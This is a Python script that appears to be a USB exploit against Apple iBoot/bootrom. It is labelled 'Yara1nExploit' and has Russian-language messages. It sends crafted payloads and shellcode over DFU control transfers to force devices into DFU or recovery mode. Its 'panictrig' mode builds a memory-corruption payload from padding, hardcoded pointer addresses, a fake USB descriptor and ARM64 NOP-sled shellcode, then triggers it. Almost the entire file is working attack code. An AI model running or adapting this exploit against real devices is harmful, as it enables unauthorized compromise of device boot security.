import time
import usb.core
import usb.util
from struct import pack
import os
import sys
from constants import DFU_PID, RECOVERY_PID
from usb_utils import find_device, wait_for_device, send_payload, clear_status, trigger
from payloads import build_dfu_payload, build_dfu_shellcode, build_recovery_payload, build_recovery_shellcode

APPLE_VID = 0x05AC

# Адреса для iBoot-6338.0.0.200.19
STRUCT_PTR = 0xFC023828
CALLBACK_PTR = 0xFC00B000

# USB дескрипторы для iBoot-6338
USB_DESCRIPTOR = pack("<IIIIIIII",
    0x190209, 0x80050101, 0x409fa, 0x1fe0000,
    0x21070000, 0xa01, 0x8, 0x0
)

class Yara1nExploit:
    def __init__(self):
        self.dev = None
        self.in_dfu = False
        self.in_recovery = False

    def enter_dfu(self):
        print("[*] Entering DFU...")
        self.dev = wait_for_device()
        try:
            self.dev.set_configuration()
        except usb.core.USBError:
            pass

        time.sleep(2)
        payload1 = build_dfu_payload()
        if not send_payload(self.dev, payload1, block=0xFFFF):
            return False
        time.sleep(2)
        clear_status(self.dev)
        
        time.sleep(2)
        payload2 = build_dfu_shellcode()
        if not send_payload(self.dev, payload2, block=1):
            return False
        time.sleep(2)
        
        if not trigger(self.dev):
            return False
            
        time.sleep(3)
        if find_device(DFU_PID):
            self.in_dfu = True
            print("[+] Device in DFU")
            return True
        return False

    def enter_recovery(self):
        print("[*] Entering Recovery...")
        if not self.in_dfu:
            if not self.enter_dfu():
                return False
        
        time.sleep(2)
        payload1 = build_recovery_payload()
        if not send_payload(self.dev, payload1, block=0xFFFF):
            return False
        time.sleep(2)
        clear_status(self.dev)
        
        time.sleep(2)
        payload2 = build_recovery_shellcode()
        if not send_payload(self.dev, payload2, block=1):
            return False
        time.sleep(2)
        
        if not trigger(self.dev):
            return False
            
        time.sleep(3)
        if find_device(RECOVERY_PID):
            self.in_recovery = True
            print("[+] Device in Recovery")
            return True
        return False

    def reboot(self):
        print("[*] Rebooting...")
        if not self.in_dfu and not self.in_recovery:
            if not self.enter_dfu():
                return False
        
        try:
            self.dev.ctrl_transfer(
                bmRequestType=0x21,
                bRequest=1,
                wValue=0,
                wIndex=0,
                data_or_wLength=b"\x00" * 8,
                timeout=2000
            )
            print("[+] Reboot command sent")
            return True
        except usb.core.USBError as e:
            print(f"[!] Error rebooting: {e}")
            return False

def main():
    exploit = Yara1nExploit()
    
    if len(sys.argv) < 2:
        print("Использование: python3 exploit.py [dfu|recovery|reboot|panictrig]")
        return

    cmd = sys.argv[1].lower()
    if cmd == "dfu":
        exploit.enter_dfu()
    elif cmd == "recovery":
        exploit.enter_recovery()
    elif cmd == "reboot":
        exploit.reboot()
    elif cmd == "panictrig":
        print("[*] Тестирование паники...")
        exploit.dev = wait_for_device()
        try:
            exploit.dev.set_configuration()
        except usb.core.USBError:
            pass
        time.sleep(2)
        payload = b"A" * 0x100
        payload += pack("<Q", STRUCT_PTR)
        payload += pack("<Q", CALLBACK_PTR)
        payload += USB_DESCRIPTOR
        payload += b"\x42" * 0x10
        send_payload(exploit.dev, payload, block=0xFFFF)
        time.sleep(2)
        clear_status(exploit.dev)
        time.sleep(2)
        shellcode = b"\x1F\x20\x03\xD5" * 8
        shellcode += b"\x00\x00\x00\x14"
        send_payload(exploit.dev, shellcode.ljust(0x100, b"\x00"), block=1)
        time.sleep(2)
        trigger(exploit.dev)
    else:
        print("Неизвестная команда")

if __name__ == "__main__":
    main() 